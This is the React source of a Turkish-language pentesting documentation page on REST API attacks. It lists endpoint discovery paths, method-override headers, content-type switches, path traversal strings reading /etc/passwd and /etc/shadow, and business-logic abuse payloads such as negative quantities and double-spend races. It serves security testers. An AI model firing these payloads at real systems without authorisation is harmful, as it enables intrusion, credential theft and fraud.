"use client"

import { motion } from "framer-motion"
import { Server, ArrowLeft, ArrowRight } from "lucide-react"
import Link from "next/link"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"

const fadeIn = { hidden: { opacity: 0, y: 20 }, visible: { opacity: 1, y: 0 } }
const stagger = { visible: { transition: { staggerChildren: 0.05 } } }

export default function RESTPage() {
  return (
    <motion.div initial="hidden" animate="visible" variants={stagger} className="max-w-4xl">
      <motion.div variants={fadeIn} className="mb-8">
        <div className="flex items-center gap-2 text-green-400 text-sm font-medium mb-4">
          <Server className="w-4 h-4" />
          <span>API Zafiyetleri</span>
        </div>
        <h1 className="text-4xl font-bold text-foreground mb-4">REST API Security</h1>
        <p className="text-lg text-muted-foreground leading-relaxed">
          REST API&apos;lerindeki güvenlik zafiyetleri. Endpoint keşfi, HTTP method tampering,
          content-type manipulation ve business logic bypass teknikleri.
        </p>
      </motion.div>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">API Endpoint Discovery</h2>
        <PayloadList
          title="Common API Paths"
          initialShow={10}
          payloads={[
            { code: `/api/v1/`, note: "Versioned API root" },
            { code: `/api/v2/` },
            { code: `/api/internal/`, note: "Internal API" },
            { code: `/api/admin/`, note: "Admin API" },
            { code: `/api/debug/`, note: "Debug endpoints" },
            { code: `/api/test/`, note: "Test endpoints" },
            { code: `/api/swagger.json`, note: "Swagger/OpenAPI spec" },
            { code: `/api/openapi.json` },
            { code: `/api/docs`, note: "API documentation" },
            { code: `/api/redoc` },
            { code: `/swagger-ui/`, note: "Swagger UI" },
            { code: `/api-docs/` },
            { code: `/.well-known/openapi`, note: "Well-known endpoint" },
            { code: `/actuator`, note: "Spring Boot Actuator" },
            { code: `/actuator/env`, note: "Environment variables" },
            { code: `/actuator/heapdump`, note: "Memory dump" },
            { code: `/actuator/mappings`, note: "Tüm endpoint'ler" },
            { code: `/_debug/`, note: "Debug routes" },
            { code: `/api/health`, note: "Health check" },
            { code: `/api/status`, note: "Status endpoint" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">HTTP Method Tampering</h2>
        <Callout type="info" title="Method Override">
          Bazı framework&apos;ler X-HTTP-Method-Override header&apos;ını destekler.
          PUT/DELETE izin verilmiyorsa POST + header deneyin.
        </Callout>
        <PayloadList
          title="Method Tampering Payloads"
          initialShow={8}
          payloads={[
            { code: `GET → POST → PUT → PATCH → DELETE → OPTIONS → HEAD → TRACE`, note: "Tüm methodları dene" },
            { code: `X-HTTP-Method-Override: PUT`, note: "Method override header" },
            { code: `X-HTTP-Method: DELETE`, note: "Alternatif header" },
            { code: `X-Method-Override: PATCH` },
            { code: `_method=PUT`, note: "Query/body parameter" },
            { code: `Content-Type: application/json + TRACE method`, note: "TRACE ile header reflection" },
            { code: `OPTIONS /api/admin`, note: "CORS preflight - allowed methods" },
            { code: `PROPFIND /api/`, note: "WebDAV method" },
            { code: `MOVE /api/resource`, note: "WebDAV MOVE" },
            { code: `COPY /api/resource`, note: "WebDAV COPY" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Content-Type Attacks</h2>
        <PayloadList
          title="Content-Type Manipulation"
          initialShow={8}
          payloads={[
            { code: `Content-Type: application/json → application/xml`, note: "XML injection vektörü" },
            { code: `Content-Type: application/json → application/x-www-form-urlencoded`, note: "Form encoding" },
            { code: `Content-Type: application/json → multipart/form-data`, note: "Multipart" },
            { code: `Content-Type: application/json → text/plain`, note: "CORS simple request" },
            { code: `Content-Type: application/json → application/x-yaml`, note: "YAML deserialization" },
            { code: `Content-Type: application/json; charset=utf-7`, note: "UTF-7 encoding" },
            { code: `Content-Type: application/json; charset=ibm037`, note: "EBCDIC encoding" },
            { code: `Content-Type: application/vnd.api+json`, note: "JSON:API format" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Path Traversal & Access Control</h2>
        <PayloadList
          title="Path Manipulation"
          initialShow={8}
          payloads={[
            { code: `/api/users/1 → /api/users/1/../../admin/config`, note: "Path traversal" },
            { code: `/api/files?path=../../../../etc/passwd`, note: "File read" },
            { code: `/api/export?file=../../../etc/shadow`, note: "Export feature abuse" },
            { code: `/api/users/../admin/users`, note: "Directory traversal" },
            { code: `/api/v2/resource → /api/v1/resource`, note: "Version downgrade" },
            { code: `/api/user/profile → /api/admin/profile`, note: "Role path manipulation" },
            { code: `/api/resource%2f..%2fadmin`, note: "URL encoded traversal" },
            { code: `/api/resource/..;/admin`, note: "Semicolon bypass (Tomcat)" },
          ]}
        />
      </motion.section>

      <motion.section variants={fadeIn} className="mt-12">
        <h2 className="text-2xl font-semibold text-foreground mb-4">Business Logic</h2>
        <PayloadList
          title="Business Logic Bypass"
          initialShow={8}
          payloads={[
            { code: `{"quantity": -1, "price": 100}`, note: "Negatif miktar → para iadesi" },
            { code: `{"amount": 0.001}`, note: "Minimum amount bypass" },
            { code: `{"currency": "USD"} → {"currency": "JPY"}`, note: "Kur farkı exploit" },
            { code: `Step 1 → Step 3 (skip Step 2)`, note: "Workflow bypass" },
            { code: `{"coupon": "DISCOUNT50"} applied 2x`, note: "Kupon tekrar kullanımı" },
            { code: `Race condition: 2x aynı anda transfer`, note: "Double spending" },
            { code: `{"from": "victim", "to": "attacker", "amount": 100}`, note: "Transfer manipulation" },
            { code: `Expires header manipulation`, note: "Subscription expire bypass" },
          ]}
        />
      </motion.section>

      <Callout type="tip" title="Test Metodolojisi">
        1. API spec/docs bulun (Swagger, OpenAPI){"\n"}
        2. Tüm endpoint&apos;leri keşfedin (fuzzing, JS dosyaları){"\n"}
        3. Her endpoint&apos;te farklı HTTP method&apos;ları deneyin{"\n"}
        4. Content-Type manipulation yapın{"\n"}
        5. Version downgrade test edin{"\n"}
        6. Business logic flow&apos;unu haritalayın ve bypass deneyin
      </Callout>

      <motion.div variants={fadeIn} className="mt-16 flex items-center justify-between pt-8 border-t border-border/50">
        <Link href="/docs/api/graphql" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <ArrowLeft className="w-4 h-4" />
          <span>GraphQL</span>
        </Link>
        <Link href="/docs/ai/owasp-llm-top-10" className="flex items-center gap-2 text-muted-foreground hover:text-primary transition-colors">
          <span>OWASP LLM Top 10</span>
          <ArrowRight className="w-4 h-4" />
        </Link>
      </motion.div>
    </motion.div>
  )
}
